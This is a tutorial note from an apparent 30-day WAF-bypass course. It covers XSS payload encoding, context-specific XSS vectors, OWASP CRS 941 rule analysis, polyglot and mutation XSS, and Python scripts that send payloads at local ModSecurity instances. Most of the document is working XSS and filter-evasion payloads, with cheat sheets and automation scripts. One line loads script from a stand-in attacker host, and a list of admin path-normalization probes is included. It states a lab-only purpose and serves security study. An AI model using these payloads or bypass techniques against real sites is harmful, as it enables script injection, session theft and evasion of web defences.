# 🎭 Day 06 — Encoding, Obfuscation & XSS WAF Bypass Mastery

> **Part of:** 30-Day WAF Bypass & Payload Crafting Journey  
> **Date:** _Add your date_  
> **Difficulty:** ⭐⭐⭐⭐⭐ Expert  
> **Time Required:** 6–7 hours  

![Day](https://img.shields.io/badge/Day-06%2F30-blue)
![Status](https://img.shields.io/badge/Status-Core%20Mastery-red)
![Focus](https://img.shields.io/badge/Focus-XSS%20WAF%20Bypass-critical)
![Difficulty](https://img.shields.io/badge/Difficulty-Expert-darkred)

> ⚠️ **Ethical Use Only:**  
> Ei note shudhu educational purpose, personal lab, CTF, PortSwigger labs, DVWA/Juice Shop, or authorized bug bounty / pentest scope er jonno. Unauthorized target e kono active testing korba na.

---

## 📑 Table of Contents

- [💎 Golden Principle](#-the-golden-principle-of-waf-bypass)
- [🎯 Objectives](#-objectives)
- [⏰ Time Breakdown](#-time-breakdown)
- [🧬 Session 1: Complete Encoding Arsenal](#-session-1-complete-encoding-arsenal)
- [🎨 Session 2: XSS Across All 6 Contexts](#-session-2-xss-across-all-6-contexts)
- [🔍 Session 3: CRS 941 Reverse Engineering](#-session-3-crs-941-reverse-engineering)
- [🧬 Session 4: Polyglot XSS + Mutation XSS](#-session-4-polyglot-xss--mutation-xss)
- [📖 Session 5: Real Hunter Payload Breakdowns](#-session-5-real-hunter-payload-breakdowns)
- [🧪 Session 6: Bypass Lab — All 4 Paranoia Levels](#-session-6-bypass-lab--all-4-paranoia-levels)
- [🏆 Day 6 Challenge](#-day-6-challenge)
- [📋 Master Cheat Sheets](#-master-cheat-sheets)
- [📚 Resources](#-resources)
- [❓ Self-Check Questions](#-self-check-questions)
- [🚀 What’s Next](#-whats-next)
- [📝 My Day 6 Notes](#-my-day-6-notes)

---

## 💎 The Golden Principle of WAF Bypass

> **A WAF and a browser do not always see the same string. Your job is to understand that parsing gap in a legal lab environment.**

```text
Attacker sends:  %253Cscript%253E
        ↓
┌──────────────────────────────┐
│ WAF sees:   %3Cscript%3E      │
│ Verdict:    ALLOW             │
└──────────────┬────────────────┘
               ↓
┌──────────────────────────────┐
│ Browser sees: <script>        │
│ Result:       Executes        │
└──────────────────────────────┘
```

This idea is the foundation of encoding, normalization mismatch, and parser confusion.

---

## 🎯 Objectives

End of this day, I will be able to:

- [ ] Apply **12+ encoding schemes** for payload transformation
- [ ] Craft **context-aware XSS** for lab environments
- [ ] Understand **OWASP CRS 941** XSS detection rules
- [ ] Build **custom polyglot payloads** in a safe lab
- [ ] Understand **mutation XSS**
- [ ] Test ModSecurity behavior across **PL1, PL2, PL3, PL4**
- [ ] Use **Hackvertor** extension efficiently
- [ ] Generate payload mutations automatically for learning and defensive testing

---

## ⏰ Time Breakdown

| Session | Topic | Duration |
|---|---|---:|
| 1 | Complete Encoding Arsenal | 75 min |
| 2 | XSS Across All 6 Contexts | 75 min |
| 3 | CRS 941 Reverse Engineering | 75 min |
| 4 | Polyglot XSS + Mutation XSS | 60 min |
| 5 | Real Hunter Payload Breakdowns | 90 min |
| 6 | Bypass Lab — All 4 PL Levels | 75 min |
| **Total** |  | **~7.5 hours** |

---

## 🧬 Session 1: Complete Encoding Arsenal

### The 12 Encodings Every Hunter Should Know

| # | Encoding | Example `<` | Best Context |
|---:|---|---|---|
| 1 | URL single encode | `%3C` | Universal |
| 2 | URL double encode | `%253C` | Proxy/backend mismatch |
| 3 | URL overlong UTF-8 | `%C0%BC` | Legacy parsers |
| 4 | HTML named entity | `&lt;` | HTML body |
| 5 | HTML decimal entity | `&#60;` | HTML / attributes |
| 6 | HTML hex entity | `&#x3C;` | HTML / attributes |
| 7 | HTML entity without semicolon | `&#60` | Browser lenient parsing |
| 8 | HTML padded entity | `&#0000060;` | Regex bypass study |
| 9 | Unicode JS escape | `\u003c` | JavaScript strings |
| 10 | Hex JS escape | `\x3c` | JavaScript strings |
| 11 | Octal JS escape | `\74` | JavaScript strings |
| 12 | Base64 | `PHNj...` | Data URI / decoder contexts |

---

## 1.1 URL Encoding

### Single Encode

```text
Input:
<script>alert(1)</script>

Output:
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

### Full Character Encoding

```text
Minimal:
%3Cscript%3E

Paranoid:
%3C%73%63%72%69%70%74%3E
```

The paranoid version can help understand how simple keyword-based filters behave.

---

## 1.2 Double Encoding

```text
Stage 1:
%3Cscript%3E

Stage 2:
%253Cscript%253E
```

### Why It Works in Some Systems

```text
WAF decodes once:
%3Cscript%3E

Backend decodes again:
<script>
```

This is a classic example of normalization mismatch.

---

## 1.3 Overlong UTF-8

```text
< normally:
U+003C

Overlong examples:
%C0%BC
%E0%80%BC
```

> ⚠️ Most modern parsers reject overlong UTF-8. This is mostly useful for understanding legacy parser behavior.

---

## 1.4 HTML Entities

```html
<!-- Named entity -->
&lt;img src=x onerror=alert(1)&gt;

<!-- Decimal entity -->
&#60;img src=x onerror=alert(1)&#62;

<!-- Hex entity -->
&#x3C;img src=x onerror=alert(1)&#x3E;

<!-- No semicolon -->
&#60img src=x onerror=alert(1)&#62

<!-- Zero padded -->
&#0000060;img src=x onerror=alert(1)&#0000062;
```

---

## 1.5 JavaScript Escapes

Inside JavaScript, these can resolve to the same function name:

```javascript
\u0061\u006c\u0065\u0072\u0074(1)
\x61\x6c\x65\x72\x74(1)
\141\154\145\162\164(1)
```

### Context Example

```html
<script>
var data = "USER_INPUT";
</script>
```

Payload idea for lab:

```javascript
\x22;\u0061lert(1);\u002F\u002F
```

After parsing:

```javascript
var data = "";alert(1);//";
```

---

## 1.6 Base64 in Data URIs

```html
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```

Another lab example:

```html
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

---

## 1.7 Hackvertor Extension

Install from Burp Suite BApp Store.

### Basic Workflow

```text
1. Highlight payload in Burp Repeater
2. Right-click
3. Hackvertor
4. Convert
5. Choose encoding
```

### Useful Hackvertor Tags

```text
<@urlencode_1>...</@urlencode_1>
<@urlencode_2>...</@urlencode_2>
<@hex_entities>...</@hex_entities>
<@decimal_entities>...</@decimal_entities>
<@base64_0>...</@base64_0>
<@js_string_unicode_0>...</@js_string_unicode_0>
<@uppercase_0>...</@uppercase_0>
```

---

## 1.8 Personal Encoder CLI

Save as:

```text
~/waf-lab/scripts/encoder.py
```

```python
#!/usr/bin/env python3
"""
Complete Encoder Toolkit — Day 06
Use for lab learning and authorized testing only.
"""

import base64
import html
import sys
import urllib.parse


class Encode:
    @staticmethod
    def url1(value: str) -> str:
        return urllib.parse.quote(value, safe="")

    @staticmethod
    def url2(value: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(value, safe=""), safe="")

    @staticmethod
    def url_all(value: str) -> str:
        return "".join(f"%{ord(char):02X}" for char in value)

    @staticmethod
    def overlong(value: str) -> str:
        result = ""
        for char in value:
            byte = ord(char)
            if byte < 128:
                result += f"%C0%{(byte | 0x80):02X}"
            else:
                result += urllib.parse.quote(char)
        return result

    @staticmethod
    def html_named(value: str) -> str:
        return html.escape(value, quote=True)

    @staticmethod
    def html_dec(value: str) -> str:
        return "".join(f"&#{ord(char)};" for char in value)

    @staticmethod
    def html_hex(value: str) -> str:
        return "".join(f"&#x{ord(char):X};" for char in value)

    @staticmethod
    def html_pad(value: str) -> str:
        return "".join(f"&#{ord(char):07d};" for char in value)

    @staticmethod
    def html_no_semi(value: str) -> str:
        return "".join(f"&#{ord(char)}" for char in value)

    @staticmethod
    def u_js(value: str) -> str:
        return "".join(f"\\u{ord(char):04x}" for char in value)

    @staticmethod
    def x_js(value: str) -> str:
        return "".join(f"\\x{ord(char):02x}" for char in value)

    @staticmethod
    def oct_js(value: str) -> str:
        return "".join(f"\\{ord(char):o}" for char in value)

    @staticmethod
    def b64(value: str) -> str:
        return base64.b64encode(value.encode()).decode()

    @staticmethod
    def mixed(value: str) -> str:
        return "".join(char.upper() if index % 2 else char.lower() for index, char in enumerate(value))

    @staticmethod
    def wrap_datauri(value: str) -> str:
        return f"data:text/html;base64,{Encode.b64(value)}"

    @staticmethod
    def all_variants(value: str) -> None:
        print(f"\n{'=' * 70}")
        print(f"Input: {value}")
        print("=" * 70)
        print(f"URL single:    {Encode.url1(value)}")
        print(f"URL double:    {Encode.url2(value)}")
        print(f"URL paranoid:  {Encode.url_all(value)}")
        print(f"URL overlong:  {Encode.overlong(value)}")
        print(f"HTML named:    {Encode.html_named(value)}")
        print(f"HTML decimal:  {Encode.html_dec(value)}")
        print(f"HTML hex:      {Encode.html_hex(value)}")
        print(f"HTML padded:   {Encode.html_pad(value)}")
        print(f"HTML no semi:  {Encode.html_no_semi(value)}")
        print(f"JS Unicode:    {Encode.u_js(value)}")
        print(f"JS Hex:        {Encode.x_js(value)}")
        print(f"JS Octal:      {Encode.oct_js(value)}")
        print(f"Base64:        {Encode.b64(value)}")
        print(f"Mixed case:    {Encode.mixed(value)}")
        print(f"Data URI:      {Encode.wrap_datauri(value)}")


if __name__ == "__main__":
    payload = " ".join(sys.argv[1:]) or "<script>alert(1)</script>"
    Encode.all_variants(payload)
```

### Usage

```bash
python3 encoder.py "<script>alert(1)</script>"
python3 encoder.py "' OR 1=1--"
```

---

# 🎨 Session 2: XSS Across All 6 Contexts

## Context Identification

Before writing any payload, identify the sink context.

Use a unique probe:

```text
xss<>"'/\test
```

Then inspect how it reflects.

```text
HTML body:
Hello xss&lt;&gt;&quot;&#39;...

HTML attribute:
<input value="xss<>&quot;...">

JavaScript string:
var x = "xss<>\"'/\\test"

URL/href:
<a href="xss<>...">

CSS:
color: xss<>

JSON:
{"name": "xss<>\"..."}
```

---

## Context 1: HTML Body

Vulnerable example:

```html
<div>USER_INPUT</div>
```

Payload examples for lab:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert`1`>
<body onload=alert(1)>
<iframe srcdoc="<svg onload=alert(1)>">
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>x</marquee>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<input autofocus onfocus=alert(1)>
```

---

## Context 2: HTML Attribute

Vulnerable example:

```html
<input value="USER_INPUT">
```

Payload examples:

```html
" onfocus=alert(1) autofocus x="
" onmouseover=alert(1) x="
"><script>alert(1)</script>
"><svg onload=alert(1)>
"><img src=x onerror=alert(1)>
' onfocus=alert(1) autofocus x='
onmouseover=alert(1) x=
```

---

## Context 3: JavaScript String

Vulnerable example:

```html
<script>
var user = "USER_INPUT";
</script>
```

Payload examples:

```javascript
";alert(1)//
\";alert(1)//
</script><svg onload=alert(1)>
\u0022;alert(1);\u002F\u002F
```

---

## Context 4: URL / href Attribute

Vulnerable example:

```html
<a href="USER_INPUT">Click</a>
```

Payload examples:

```html
javascript:alert(1)
javascript:alert(1)//
javascript://comment%0aalert(1)
JaVaScRiPt:alert(1)
java&#x09;script:alert(1)
javascript&colon;alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

## Context 5: JavaScript Event Handler

Vulnerable example:

```html
<button onclick="do('USER_INPUT')">Click</button>
```

Payload examples:

```javascript
');alert(1);//
');alert(1);//'
')-alert(1)-('
```

---

## Context 6: JSON Response

Vulnerable example:

```json
{"name": "USER_INPUT"}
```

If later rendered into HTML unsafely:

```javascript
document.write("<div>" + user.name + "</div>");
```

Payload examples:

```json
{"name": "</script><script>alert(1)</script>"}
{"name": "<img src=x onerror=alert(1)>"}
{"name": "\u003cscript\u003ealert(1)\u003c/script\u003e"}
```

---

## Context Decision Tree

```text
Your input reflects where?

├── HTML body
│   ├── <script> blocked? → Try SVG/img-style lab payloads
│   ├── All tags blocked? → Try entity encoding
│   └── Strict filter? → Try rare tags in lab
│
├── HTML attribute
│   ├── Quoted? → Break out with matching quote
│   ├── Unquoted? → Space + event injection
│   └── Quotes encoded? → Try HTML entities
│
├── JavaScript string
│   ├── Can break quotes? → ";alert(1)//
│   ├── Quotes escaped? → </script> breakout
│   └── Both protected? → Unicode escape analysis
│
├── URL/href
│   ├── javascript: allowed? → Direct test
│   ├── Keyword blocked? → Entity-based scheme study
│   └── Scheme blocked? → Data URI test in lab
│
├── Event handler
│   └── String arg? → ');alert(1);//
│
└── JSON response
    └── Rendered as HTML? → Script breakout / HTML injection test
```

---

# 🔍 Session 3: CRS 941 Reverse Engineering

> Understand the rules first. Then test behavior in a local ModSecurity lab.

---

## Study the CRS 941 Rules

```bash
cd ~/crs-reference
cat rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf | less
```

---

## CRS 941 Rule Categories

| Rule ID | What It Blocks | Lab Bypass Study |
|---|---|---|
| `941100` | `<script>` tags | Alternative tags |
| `941110` | Event handlers | Rare events |
| `941130` | CSS expression/url vectors | Legacy behavior |
| `941140` | `javascript:` URIs | Entity and whitespace study |
| `941160` | SVG/onload style vectors | SVG alternative events |
| `941170` | iframe javascript vectors | `srcdoc` study |
| `941180` | Node.js vectors | Context-specific |
| `941190` | CSS-based vectors | Legacy behavior |
| `941200` | Node tree manipulation | Rare |
| `941210` | IE-specific vectors | Legacy |
| `941220` | Flash-based vectors | Legacy |
| `941230` | `<embed>` tag | Alternative embedding |
| `941240` | Meta refresh | Legacy redirect attacks |
| `941250` | IE moniker | Legacy |
| `941260` | Marquee events | Rare event testing |
| `941270` | Link stylesheet | Style tag alternatives |
| `941310` | US-ASCII encoding tricks | Encoding tests |
| `941320` | HTML handler abuse | Syntax variation |
| `941350` | UTF-7 | Legacy |
| `941360` | JSFuck | Obfuscation study |

---

## Sample Rule Analysis

Simplified example:

```apache
SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS|ARGS_NAMES|ARGS|XML:/* \
  "@rx (?i)(?:<script[^>]*>[\s\S]*?)" \
  "id:941100,\
  phase:2,\
  block,\
  msg:'XSS Attack Detected via libinjection'"
```

### Reverse Engineering Notes

```text
Pattern:
<script followed by anything, then >

Case insensitive:
(?i)

Multi-line compatible:
[\s\S]
```

---

## Practical Rule Triggering

Terminal 1:

```bash
docker logs -f waf-pl2 2>&1 | grep -E "id \"941"
```

Terminal 2:

```bash
curl "http://localhost:9002/?q=<script>alert(1)</script>"
curl "http://localhost:9002/?q=<svg onload=alert(1)>"
curl "http://localhost:9002/?q=<xss onauxclick=alert(1)>"
```

Document which rule IDs triggered.

---

## Anomaly Scoring Concept

CRS uses cumulative scoring.

```text
Default threshold example:
5

Payload:
<script>alert(1)</script>

Possible result:
941100 triggers
Score reaches threshold
Request blocked
```

Goal in lab: understand which payload parts add score and why.

---

## Automated CRS Rule Fingerprinter

Save as:

```text
~/waf-lab/scripts/crs_fingerprint.py
```

```python
#!/usr/bin/env python3
"""
Fire lab payloads and observe which CRS behavior appears.
Use only against your local ModSecurity lab.
"""

import sys
import requests


PAYLOADS = {
    "<script>alert(1)</script>": "941100 expected",
    "<svg onload=alert(1)>": "941160 expected",
    "<img src=x onerror=alert(1)>": "XSS event handler test",
    "<iframe src=javascript:alert(1)>": "941170 style test",
    "<marquee onstart=alert(1)>": "941260 style test",
    "<xss onauxclick=alert(1)>": "rare tag/event test",
    "<details open ontoggle=alert(1)>": "details event test",
    "<svg><animate onbegin=alert(1)>": "SMIL event test",
    "javascript:alert(1)": "941140 expected",
    "\"><svg onload=alert(1)>": "attribute breakout test",
}


def test(url: str, payload: str):
    try:
        response = requests.get(url, params={"q": payload}, timeout=5)
        return response.status_code
    except requests.RequestException:
        return "error"


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9002"

    print(f"\n{'=' * 70}")
    print(f"Target: {target}")
    print("=" * 70)

    for payload, note in PAYLOADS.items():
        status = test(target, payload)
        icon = "❌" if status == 403 else "✅"
        print(f"{icon} {status} | {payload[:50]:50} | {note}")
```

Run across PL levels:

```bash
for port in 9001 9002 9003 9004; do
  python3 crs_fingerprint.py http://localhost:$port
done
```

---

# 🧬 Session 4: Polyglot XSS + Mutation XSS

## What is a Polyglot?

A polyglot payload is designed to work in multiple contexts.

---

## Famous Polyglot Example

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Anatomy

| Piece | Purpose |
|---|---|
| `jaVasCript:` | URL context |
| Comments / quotes | JS and attribute cleanup |
| `oNcliCk=alert()` | Event handler fallback |
| `%0D%0A` | CRLF-style context cleanup |
| Closing tags | Parent tag escape |
| SVG fragment | HTML fallback |

---

## Building Your Own Polyglot

```text
Step 1: Attribute breakout
Step 2: Tag breakout
Step 3: Parent tag closure
Step 4: Main payload
Step 5: Comment cleanup
```

Example:

```html
"></script></style></title><svg onload=alert(1)><!--
```

---

## 10 Lab Polyglots

```html
"><svg onload=alert(1)>
'"></div><svg/onload=alert(1)>
'"></script></style></title></textarea><svg onload=alert(1)>
javascript:/*--></title></style></textarea></script><svg onload=alert(1)>
<img src=x onerror=confirm(1)>"'><svg/onload=alert(1)>
x"/><svg onload=alert`1`>x
<math><maction actiontype=statusline xlink:href=javascript:alert(1)>x</maction>
" autofocus onfocus=alert(1) x="
&#60;svg onload=alert(1)&#62;
<svg/onload=alert`1`>
```

---

## Mutation XSS

Mutation XSS happens when the browser mutates HTML after sanitization and creates active markup.

### Example Pattern

```html
<form><math><mtext></form><form><mglyph><svg><mtext></style><img src=x onerror=alert(1)>
```

After browser reparsing, the structure may change and unexpected active elements may appear.

---

## mXSS via Namespace Confusion

```html
<svg><p><style><a id="</style><img src=x onerror=alert(1)//">
```

---

## mXSS via noscript/template

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

---

## Key mXSS Research

- Masato Kinugawa
- Michał Bentkowski
- Cure53 mXSS papers
- DOMPurify bypass research

---

# 📖 Session 5: Real Hunter Payload Breakdowns

> Ei section e real-world inspired payload patterns breakdown kora holo. Use only authorized labs.

---

## Breakdown 1 — HTML Entity in `javascript:` URI

Blocked pattern:

```html
<a href="javascript:alert(document.domain)">Click</a>
```

Bypass pattern for lab:

```html
<a href="java&#x09;script:alert(document.domain)">Click</a>
```

### Why It Works

| Component | Purpose |
|---|---|
| `java` | First part of scheme |
| `&#x09;` | Tab entity |
| `script:` | Rest of scheme |
| `alert()` | Execution sink |

Variations:

```html
<a href="java&#x0a;script:alert(1)">
<a href="java&#x0d;script:alert(1)">
<a href="java&#x20;script:alert(1)">
<a href="&#x6a;avascript:alert(1)">
<a href="javascript&colon;alert(1)">
```

---

## Breakdown 2 — Minimal No-Paren Payload

```html
<svg/onload=alert`1`>
```

### Why It Works

| Piece | Why |
|---|---|
| `<svg` | Alternative tag |
| `/` | Space-like separator in HTML parsing |
| `onload=` | Auto event |
| `` alert`1` `` | Tagged template call |

Variations:

```html
<svg/onload=alert`1`>
<svg/onload=prompt`1`>
<svg/onload=confirm`1`>
<svg/onload=(alert)`1`>
<svg/onload=alert(/xss/)>
<svg/onload=[1].map(alert)>
<svg/onload=window>
```

---

## Breakdown 3 — SVG Animate Event

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### Anatomy

| Piece | Function |
|---|---|
| `<svg>` | SVG container |
| `<animate>` | SMIL animation |
| `onbegin=` | Animation start event |
| `attributeName=x` | Required attribute |
| `dur=1s` | Animation duration |

Related events:

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><animate onend=alert(1) attributeName=x dur=1s>
<svg><animate onrepeat=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=y>
<svg><discard onbegin=alert(1)>
```

---

## Breakdown 4 — Protocol-Relative URL

```html
<script src="//attacker.example/x.js"></script>
```

### Why It Matters

```text
//attacker.example
```

Browser uses the current page protocol.

---

## Breakdown 5 — JSON Content-Type XSS Pattern

Vulnerable pattern:

```json
{
  "username": "</script><img src=x onerror=alert(1)>"
}
```

Risk occurs when JSON is later inserted into HTML unsafely.

Example unsafe render:

```javascript
document.write('<script>var u="' + user.username + '";</script>');
```

Lab request:

```bash
curl -X POST http://localhost:3000/api/profile \
  -H "Content-Type: application/json" \
  -d '{"username": "</script><img src=x onerror=alert(1)>"}'
```

---

## Breakdown 6 — Unicode Normalization Bypass

Example:

```html
<img src＝x onerror＝alert(1)>
```

Here `＝` is full-width equals sign.

### Homoglyph Examples

| ASCII | Unicode Lookalike |
|---|---|
| `=` | `＝` |
| `(` | `（` |
| `)` | `）` |
| `<` | `＜` |
| `>` | `＞` |
| `/` | `／` |
| `"` | `＂` |
| `'` | `＇` |

---

## Breakdown 7 — Style Tag Escape

Context:

```html
<style>
USER_INPUT
</style>
```

Payload:

```html
</style><svg onload=alert(1)>
```

Legacy CSS examples:

```html
<style>
@import url(javascript:alert(1));
</style>
```

```html
<style>
body { background: url(javascript:alert(1)); }
</style>
```

> ⚠️ Modern browsers usually block JavaScript in CSS URLs.

---

## Breakdown 8 — SVG Animate `href`

```html
<svg><a><animate attributeName=href values=javascript:alert(1)><text x=20 y=20>Click</text></a>
```

### Why It Is Interesting

- No `<script>` tag
- No direct event handler
- JavaScript scheme appears in SVG animation value
- Requires user interaction in many cases

---

## Breakdown 9 — Form Action JavaScript URL

```html
<form><button formaction=javascript:alert(1)>CLICK</button></form>
```

This is useful for understanding how form-related attributes can become sinks.

---

## Breakdown 10 — Path Normalization Study

Examples for local lab path normalization testing:

```text
/admin
/admiN
//admin
/./admin
/%EF%BC%8Fadmin
/\..%2Fadmin
```

---

# 🧪 Session 6: Bypass Lab — All 4 Paranoia Levels

## Mission

Start ModSecurity at each paranoia level and test which payloads are blocked or allowed.

```text
http://localhost:9001  → PL1
http://localhost:9002  → PL2
http://localhost:9003  → PL3
http://localhost:9004  → PL4
```

---

## Automated Testing Framework

Save as:

```text
~/waf-lab/scripts/bypass_matrix.py
```

```python
#!/usr/bin/env python3
"""
Test payload behavior across all local ModSecurity PL levels.
Use only against your local lab.
"""

import requests


PAYLOADS = [
    "<script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "<svg onload=alert(1)>",
    "<svg/onload=alert`1`>",
    "<img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>x",
    "<video><source onerror=alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg onauxclick=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<svg onload=eval(atob('YWxlcnQoMSk='))>",
    "<svg onload=setTimeout`alert\\x281\\x29`>",
    "<svg onload=[1].map(alert)>",
    "<xss onauxclick=alert(1)>",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "<a href=\"java&#x09;script:alert(1)\">x</a>",
    "\"><svg onload=alert(1)>",
    "javascript:/*--></title></style></textarea></script><svg onload=alert(1)>",
    "<form><button formaction=javascript:alert(1)>x</button></form>",
    "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>x</maction>",
    "<svg><a><animate attributeName=href values=javascript:alert(1)><text>click</text></a>",
    "<svg onload＝alert(1)>",
]

PORTS = {
    1: 9001,
    2: 9002,
    3: 9003,
    4: 9004,
}


def test(port: int, payload: str):
    try:
        response = requests.get(
            f"http://localhost:{port}/",
            params={"q": payload},
            timeout=5,
        )
        return response.status_code
    except requests.RequestException:
        return "ERR"


def run_matrix():
    print(f"\n{'Payload':<55} │ PL1 │ PL2 │ PL3 │ PL4")
    print("─" * 80)

    for payload in PAYLOADS:
        row = []

        for _, port in PORTS.items():
            status = test(port, payload)

            if status == 200:
                row.append("✅")
            elif status == 403:
                row.append("❌")
            else:
                row.append("⚠️")

        display = payload[:52] + "..." if len(payload) > 55 else payload
        print(f"{display:<55} │ {row[0]}  │ {row[1]}  │ {row[2]}  │ {row[3]}")


if __name__ == "__main__":
    run_matrix()
```

Run it:

```bash
python3 bypass_matrix.py
```

Document results in:

```text
Day-06-results.md
```

---

## Manual Exploration Tasks

### PL1

- Test basic payloads
- Observe rule IDs
- Note what passes

### PL2

- Compare against PL1
- Document stricter detections

### PL3

- Test rare tags/events
- Check anomaly scores

### PL4

- Expect strict blocking
- Focus on understanding logs and false positives

---

# 🏆 Day 6 Challenge

Mark Day 6 complete after:

- [ ] Read CRS 941 config file
- [ ] Test `encoder.py` with 3+ payloads
- [ ] Run `crs_fingerprint.py` on all 4 PL levels
- [ ] Run `bypass_matrix.py`
- [ ] Document PL1 results
- [ ] Document PL2 results
- [ ] Document PL3 results
- [ ] Document PL4 results
- [ ] Add 10 hunter breakdowns to payload vault
- [ ] Build 1 custom polyglot of your own
- [ ] Test one mXSS example in a safe endpoint
- [ ] Use Hackvertor to generate 10+ variants
- [ ] Push `Day-06.md`, scripts, and notes to GitHub

---

# 📋 Master Cheat Sheets

## Cheat Sheet 1: Encoding Quick Reference

```text
CHAR   │ URL-1 │ URL-2  │ HTML-dec │ HTML-hex │ JS-unicode │ JS-hex
────── │ ───── │ ────── │ ──────── │ ──────── │ ────────── │ ──────
<      │ %3C   │ %253C  │ &#60;    │ &#x3C;   │ \u003c     │ \x3c
>      │ %3E   │ %253E  │ &#62;    │ &#x3E;   │ \u003e     │ \x3e
"      │ %22   │ %2522  │ &#34;    │ &#x22;   │ \u0022     │ \x22
'      │ %27   │ %2527  │ &#39;    │ &#x27;   │ \u0027     │ \x27
(      │ %28   │ %2528  │ &#40;    │ &#x28;   │ \u0028     │ \x28
)      │ %29   │ %2529  │ &#41;    │ &#x29;   │ \u0029     │ \x29
=      │ %3D   │ %253D  │ &#61;    │ &#x3D;   │ \u003d     │ \x3d
space  │ %20   │ %2520  │ &#32;    │ &#x20;   │ \u0020     │ \x20
tab    │ %09   │ %2509  │ &#9;     │ &#x9;    │ \u0009     │ \x09
LF     │ %0A   │ %250A  │ &#10;    │ &#xA;    │ \u000a     │ \x0a
```

---

## Cheat Sheet 2: Top XSS Lab Payloads

```html
<svg/onload=alert`1`>
<img src=x onerror=alert`1`>
<details open ontoggle=alert`1`>
<marquee onstart=alert`1`>x</marquee>
<input autofocus onfocus=alert`1`>
<video><source onerror=alert`1`>
<audio src=x onerror=alert`1`>
<svg><animate onbegin=alert`1` attributeName=x dur=1s>
<svg><a><animate attributeName=href values=javascript:alert(1)><text>x</text></a>
<form><button formaction=javascript:alert`1`>X
<math><maction actiontype=statusline xlink:href=javascript:alert(1)>X
<iframe srcdoc="<svg onload=alert(1)>">
<a href="java&#x09;script:alert(1)">click</a>
<a href="javascript&colon;alert(1)">click</a>
<xss onauxclick=alert(1)>click</xss>
"><svg onload=alert(1)>
'"><img src=x onerror=alert(1)>
javascript:/*--></title></style></textarea></script><svg onload=alert(1)>
<script>alert(/xss/.source)</script>
<svg onload=eval(atob('YWxlcnQoMSk='))>
```

---

## Cheat Sheet 3: Context → Payload Map

```text
Context           │ Go-To Lab Payload
───────────────── │ ─────────────────────────────────────
HTML body         │ <svg/onload=alert`1`>
HTML attr quoted  │ " autofocus onfocus=alert`1` x="
HTML attr unquot  │ x onmouseover=alert`1` y=
JS string quoted  │ ";alert(1)//
JS string dbl-q   │ \";alert(1)//
JS variable       │ -alert(1)-
URL href          │ javascript:alert(1)
URL href blocked  │ java&#x09;script:alert(1)
Event handler     │ ');alert(1);//
CSS value         │ expression(alert(1))  legacy
JSON field        │ </script><svg onload=alert(1)>
```

---

## Cheat Sheet 4: CRS 941 Rule Study

```text
Rule ID │ What It Blocks     │ Study Direction
─────── │ ────────────────── │ ─────────────────────────────
941100  │ <script>           │ Alternative tags
941110  │ Common events      │ Rare events
941140  │ javascript: URI    │ Entity/whitespace behavior
941160  │ <svg onload>       │ SVG SMIL events
941170  │ iframe js URI      │ srcdoc behavior
941260  │ marquee events     │ details/toggle behavior
```

---

# 📚 Resources

## Must-Read

- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [HTML5 Security Cheatsheet](https://html5sec.org/)
- [Brutelogic XSS Cheat Sheet](https://brutelogic.com.br/blog/)
- [OWASP XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

## CRS

- [OWASP CRS Source](https://github.com/coreruleset/coreruleset)
- [CRS Documentation](https://coreruleset.org/docs/)

## mXSS Research

- [Cure53 mXSS Paper](https://cure53.de/fp170.pdf)
- DOMPurify bypass research
- Michał Bentkowski research
- Masato Kinugawa research

## Tools

- [Hackvertor](https://github.com/hackvertor/hackvertor)
- [CyberChef](https://gchq.github.io/CyberChef/)

---

# ❓ Self-Check Questions

1. Parser inconsistency kivabe WAF bypass enable kore?
2. Double URL encoding keno kaj kore?
3. `<svg/onload=alert\`1\`>` payload e backtick er role ki?
4. CRS `941100` vs `941160` — kon payload kon rule trigger kore?
5. Anomaly scoring threshold concept ki?
6. mXSS e browser mutation concept explain koro.
7. Full-width Unicode `＝` keno filter miss korte pare?
8. Polyglot payload er 5 ta main component ki?
9. `<form><button formaction=javascript:...>` kivabe sink hote pare?
10. `java&#x09;script:` browser kivabe parse kore?

✅ All 10 answered correctly? **Day 6 complete!**

---

# 🚀 What’s Next?

**Day 7 Preview:** SQLi + NoSQLi Deep + Filter Evasion

- SQLi types: Union, Error, Blind, Time, OOB
- MySQL/PostgreSQL/MSSQL/Oracle syntax differences
- sqlmap tamper scripts
- NoSQLi for MongoDB
- CRS 942 rule study
- Real hunter SQLi payload breakdowns

---

# 📝 My Day 6 Notes

## Payloads That Bypassed Each PL

### PL1 Bypasses

```text
-
-
-
```

